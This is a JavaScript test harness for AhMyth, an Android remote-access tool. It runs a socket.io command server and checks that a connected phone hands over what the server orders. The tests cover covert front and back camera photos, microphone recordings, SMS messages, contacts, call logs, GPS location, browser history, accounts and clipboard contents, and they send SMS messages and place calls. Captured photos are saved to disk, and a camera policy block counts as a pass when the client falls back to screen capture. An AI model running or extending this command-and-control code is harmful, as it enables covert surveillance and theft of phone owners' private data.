// Comprehensive Automated Test Suite for AhMyth
// Emulates the server, sends commands, verifies responses, and checks ADB logs.

const { Server } = require('socket.io');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');

// Configuration
const PORT = 1234;
const TEST_TIMEOUT = 15000; // 15 seconds timeout per test
const TOTAL_TIMEOUT = 300000; // 5 minutes total timeout

// Colors for output
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    blue: "\x1b[34m"
};

function log(msg, type = 'info') {
    const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
    let color = colors.reset;
    if (type === 'success') color = colors.green;
    if (type === 'error') color = colors.red;
    if (type === 'warn') color = colors.yellow;
    if (type === 'header') color = colors.cyan;
    if (type === 'debug') color = colors.blue;
    
    console.log(`${color}[${timestamp}] ${msg}${colors.reset}`);
}

// Test Definitions
const tests = [
    {
        id: 'connection',
        name: 'Client Connection',
        description: 'Wait for client to connect and verify handshake',
        run: (socket, resolve, reject) => {
            log(`Client connected from ${socket.handshake.address}`, 'success');
            log(`Device: ${socket.handshake.query.manf} ${socket.handshake.query.model}`);
            log(`Android Version: ${socket.handshake.query.release}`);
            resolve(true);
        }
    },
    {
        id: 'camera_list',
        name: 'Camera List',
        description: 'Request available cameras',
        command: { order: 'x0000ca', extra: 'camList', action: 'camList' },
        verify: (data) => data.camList === true && Array.isArray(data.list) && data.list.length > 0
    },
    {
        id: 'camera_photo',
        name: 'Camera Photo (Back)',
        description: 'Take a photo with the back camera',
        command: { order: 'x0000ca', extra: '0', action: 'takePic', cameraID: 0 },
        verify: (data) => {
            if (data.bypass === true) {
                log('Camera blocked by policy - fell back to screen capture', 'warn');
                return true;
            }
            if (data.image === true && data.buffer) {
                log(`Received photo: ${Math.round(data.buffer.length/1024)} KB`);
                fs.writeFileSync(`test_photo_${Date.now()}.jpg`, data.buffer);
                return true;
            }
            return false;
        }
    },
    {
        id: 'camera_photo_front',
        name: 'Camera Photo (Front)',
        description: 'Take a photo with the front camera',
        command: { order: 'x0000ca', extra: '1', action: 'takePic', cameraID: 1 },
        verify: (data) => {
            if (data.bypass === true) {
                log('Camera blocked by policy - fell back to screen capture', 'warn');
                return true;
            }
            if (data.image === true && data.buffer) {
                log(`Received photo: ${Math.round(data.buffer.length/1024)} KB`);
                fs.writeFileSync(`test_photo_front_${Date.now()}.jpg`, data.buffer);
                return true;
            }
            return false;
        }
    },
    {
        id: 'browser_history',
        name: 'Browser History',
        description: 'Get browser history',
        command: { order: 'x0000bh', extra: 'history' },
        verify: (data) => data.history !== undefined || Array.isArray(data)
    },
    {
        id: 'browser_bookmarks',
        name: 'Browser Bookmarks',
        description: 'Get browser bookmarks',
        command: { order: 'x0000bh', extra: 'bookmarks' },
        verify: (data) => data.bookmarks !== undefined || Array.isArray(data)
    },
    {
        id: 'accounts',
        name: 'Accounts',
        description: 'Get device accounts',
        command: { order: 'x0000ac' },
        verify: (data) => Array.isArray(data) || (data.accounts && Array.isArray(data.accounts))
    },
    {
        id: 'make_call',
        name: 'Make Call',
        description: 'Attempt to initiate a call (to 123)',
        command: { order: 'x0000mc2', phoneNumber: '123' },
        verify: (data) => data.success === true || data.error !== undefined
    },
    {
        id: 'send_sms',
        name: 'Send SMS',
        description: 'Attempt to send SMS (to 123)',
        command: { order: 'x0000sm', extra: 'sendSMS', to: '123', sms: 'AhMyth Test' },
        verify: (data) => data === true || data === false || data.success !== undefined
    },
    {
        id: 'file_manager',
        name: 'File Manager (Root)',
        description: 'List files in root directory',
        command: { order: 'x0000fm', extra: 'ls', path: '/' },
        verify: (data) => Array.isArray(data) || (data && Array.isArray(JSON.parse(data)))
    },
    {
        id: 'sms_list',
        name: 'SMS List',
        description: 'Get SMS messages',
        command: { order: 'x0000sm', extra: 'ls' },
        verify: (data) => {
            if (Array.isArray(data)) return true;
            if (typeof data === 'object' && data !== null) return true; // Accept object response (JSONArray)
            try {
                const parsed = JSON.parse(data);
                return Array.isArray(parsed) || (typeof parsed === 'object' && parsed !== null);
            } catch (e) {
                return false;
            }
        }
    },
    {
        id: 'contacts_list',
        name: 'Contacts List',
        description: 'Get contacts',
        command: { order: 'x0000cn' },
        verify: (data) => {
            if (Array.isArray(data)) return true;
            if (typeof data === 'object' && data !== null) return true;
            try {
                const parsed = JSON.parse(data);
                return Array.isArray(parsed) || (typeof parsed === 'object' && parsed !== null);
            } catch (e) {
                return false;
            }
        }
    },
    {
        id: 'call_logs',
        name: 'Call Logs',
        description: 'Get call logs',
        command: { order: 'x0000cl' },
        verify: (data) => {
            if (Array.isArray(data)) return true;
            if (typeof data === 'object' && data !== null) return true;
            try {
                const parsed = JSON.parse(data);
                return Array.isArray(parsed) || (typeof parsed === 'object' && parsed !== null);
            } catch (e) {
                return false;
            }
        }
    },
    {
        id: 'location',
        name: 'Location',
        description: 'Get GPS location',
        command: { order: 'x0000lm', action: 'get' },
        verify: (data) => {
            if (data === 'EnableGPS') {
                log('GPS Disabled on device', 'warn');
                return true; // Pass but warn
            }
            const loc = typeof data === 'string' ? JSON.parse(data) : data;
            return loc.lat !== undefined && loc.lng !== undefined;
        }
    },
    {
        id: 'device_info',
        name: 'Device Info',
        description: 'Get basic device info',
        command: { order: 'x0000di' },
        verify: (data) => data.id !== undefined && data.model !== undefined
    },
    // New Forensic Commands
    {
        id: 'system_info',
        name: 'System Info (Full)',
        description: 'Get detailed system info',
        command: { order: 'x0000si', extra: 'all' },
        verify: (data) => data.system !== undefined && data.battery !== undefined
    },
    {
        id: 'wifi_info',
        name: 'WiFi Info',
        description: 'Get WiFi connection info',
        command: { order: 'x0000wf' },
        verify: (data) => data.mac !== undefined || data.ssid !== undefined
    },
    {
        id: 'clipboard',
        name: 'Clipboard',
        description: 'Get clipboard content',
        command: { order: 'x0000cb', extra: 'get' },
        verify: (data) => data.text !== undefined
    },
    {
        id: 'microphone',
        name: 'Microphone (Record)',
        description: 'Record 3 seconds of audio',
        command: { order: 'x0000mc', sec: 3, action: 'start' },
        verify: (data) => data && data.buffer && data.buffer.length > 0
    }
];

let server;
let ioServer;
let clientSocket;
let currentTestIndex = 0;
let testResults = {};

function startServer() {
    return new Promise((resolve) => {
        log(`Starting test server on port ${PORT}...`, 'header');
        server = http.createServer();
        server.listen(PORT, '0.0.0.0');
        
        ioServer = new Server(server, {
            pingInterval: 25000,
            pingTimeout: 20000,
            allowEIO3: true, // Allow older clients
            cors: {
                origin: "*",
                methods: ["GET", "POST"]
            }
        });
        
        ioServer.on('connection', (socket) => {
            log(`Client connected: ${socket.id}`, 'success');
            clientSocket = socket;
            
            // Handle disconnection
            socket.on('disconnect', (reason) => {
                log(`Client disconnected: ${reason}`, 'warn');
                clientSocket = null;
            });

            // Start tests
            runNextTest();
        });
        
        resolve();
    });
}

function runNextTest() {
    if (currentTestIndex >= tests.length) {
        finishTesting();
        return;
    }

    const test = tests[currentTestIndex];
    log(`\n[TEST ${currentTestIndex + 1}/${tests.length}] ${test.name}`, 'header');
    
    if (test.id === 'connection') {
        // Already connected if we are here
        testResults[test.id] = { status: 'passed' };
        currentTestIndex++;
        runNextTest();
        return;
    }

    if (!clientSocket) {
        log('Client not connected, pausing...', 'warn');
        setTimeout(runNextTest, 2000);
        return;
    }

    // Set up test timeout
    let testTimeout = setTimeout(() => {
        log(`[FAIL] ${test.name} timed out`, 'error');
        testResults[test.id] = { status: 'failed', error: 'Timeout' };
        
        // Clean up listeners if socket is still active
        if (clientSocket) {
            clientSocket.removeAllListeners(test.command.order);
        }
        
        // Move to next
        currentTestIndex++;
        runNextTest();
    }, TEST_TIMEOUT);

    // Send Command
    log(`Sending command: ${test.command.order}`, 'debug');
    clientSocket.emit('order', test.command);

    // Listen for response
    clientSocket.once(test.command.order, (data) => {
        clearTimeout(testTimeout);
        log(`Received response for ${test.command.order}`, 'debug');
        
        try {
            if (test.verify(data)) {
                log(`[PASS] ${test.name}`, 'success');
                testResults[test.id] = { status: 'passed' };
            } else {
                log(`[FAIL] ${test.name} validation failed`, 'error');
                console.log('Response:', data);
                testResults[test.id] = { status: 'failed', error: 'Validation failed' };
            }
        } catch (e) {
            log(`[FAIL] ${test.name} error: ${e.message}`, 'error');
            testResults[test.id] = { status: 'failed', error: e.message };
        }

        // Delay before next test
        setTimeout(() => {
            currentTestIndex++;
            runNextTest();
        }, 1000);
    });
}

function finishTesting() {
    log('\n=== TEST SUMMARY ===', 'header');
    let passed = 0;
    let failed = 0;
    
    tests.forEach(test => {
        const result = testResults[test.id];
        if (result && result.status === 'passed') {
            passed++;
            console.log(`${colors.green}✓ ${test.name}${colors.reset}`);
        } else {
            failed++;
            const error = result ? result.error : 'Skipped';
            console.log(`${colors.red}✗ ${test.name} - ${error}${colors.reset}`);
        }
    });
    
    console.log(`\nTotal: ${tests.length}`);
    console.log(`Passed: ${passed}`);
    console.log(`Failed: ${failed}`);
    
    // Close server
    if (ioServer) ioServer.close();
    if (server) server.close();
    process.exit(failed > 0 ? 1 : 0);
}

// Global Timeout
setTimeout(() => {
    log('\n[ERROR] Global timeout reached (5 minutes). Exiting.', 'error');
    process.exit(1);
}, TOTAL_TIMEOUT);

// Start everything
startServer();

